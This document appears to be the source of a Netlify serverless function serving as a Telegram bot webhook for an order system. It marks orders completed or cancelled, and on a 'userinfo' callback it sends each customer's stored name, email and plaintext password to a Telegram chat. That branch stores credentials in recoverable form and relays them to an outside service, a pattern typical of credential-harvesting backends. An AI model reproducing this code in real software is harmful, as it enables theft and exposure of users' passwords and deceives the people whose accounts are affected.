import { getStore } from '@netlify/blobs';

async function tgRequest(token, method, body) {
  try {
    const res = await fetch(`https://api.telegram.org/bot${token}/${method}`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(body),
    });
    return res.json();
  } catch (err) {
    console.error(`Telegram ${method} error:`, err.message);
    return { ok: false };
  }
}

export const handler = async (event) => {
  if (event.httpMethod !== 'POST') {
    return { statusCode: 405, body: 'Method not allowed' };
  }

  const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;

  try {
    const update = JSON.parse(event.body || '{}');
    const cb = update.callback_query;

    if (cb && BOT_TOKEN) {
      const [action, orderId] = (cb.data || '').split(':');

      if (action === 'complete' || action === 'cancel') {
        const newStatus = action === 'complete' ? 'completed' : 'failed';
        const badge = action === 'complete' ? '✅ COMPLETED' : '❌ CANCELLED';

        try {
          const store = getStore('orders');
          const order = await store.get(orderId, { type: 'json' });
          if (order) {
            await store.setJSON(orderId, { ...order, status: newStatus });
          }
        } catch (err) {
          console.warn('Blobs update failed (non-fatal):', err.message);
        }

        await tgRequest(BOT_TOKEN, 'answerCallbackQuery', {
          callback_query_id: cb.id,
          text: `Order ${badge}`,
        });

        await tgRequest(BOT_TOKEN, 'editMessageText', {
          chat_id: cb.message.chat.id,
          message_id: cb.message.message_id,
          text: cb.message.text + `\n\n${badge}`,
          parse_mode: 'HTML',
        });

        console.log(`Order ${orderId} marked as ${newStatus}`);

      } else if (action === 'userinfo') {
        let infoText = `👤 <b>USER INFO</b>\n━━━━━━━━━━━━━━━━━━\n`;

        try {
          const store = getStore('orders');
          const order = await store.get(orderId, { type: 'json' });
          if (order?.userInfo) {
            const u = order.userInfo;
            infoText +=
              `🪪 <b>User ID:</b> <code>${u.userId}</code>\n` +
              `👤 <b>Name:</b> ${u.name}\n` +
              `📧 <b>Email:</b> <code>${u.email}</code>\n` +
              `🔑 <b>Password:</b> <code>${u.password}</code>\n` +
              `📅 <b>Registered:</b> ${u.registeredDate}\n` +
              `━━━━━━━━━━━━━━━━━━\n` +
              `📦 <b>Order ID:</b> <code>${orderId}</code>`;
          } else {
            infoText += 'No user info available for this order.';
          }
        } catch (err) {
          console.warn('Blobs read failed:', err.message);
          infoText += 'Error fetching user info.';
        }

        await tgRequest(BOT_TOKEN, 'answerCallbackQuery', {
          callback_query_id: cb.id,
          text: 'User info sent!',
        });

        await tgRequest(BOT_TOKEN, 'sendMessage', {
          chat_id: cb.message.chat.id,
          text: infoText,
          parse_mode: 'HTML',
        });
      }
    }
  } catch (err) {
    console.error('Webhook handler error:', err.message);
  }

  return { statusCode: 200, body: 'OK' };
};
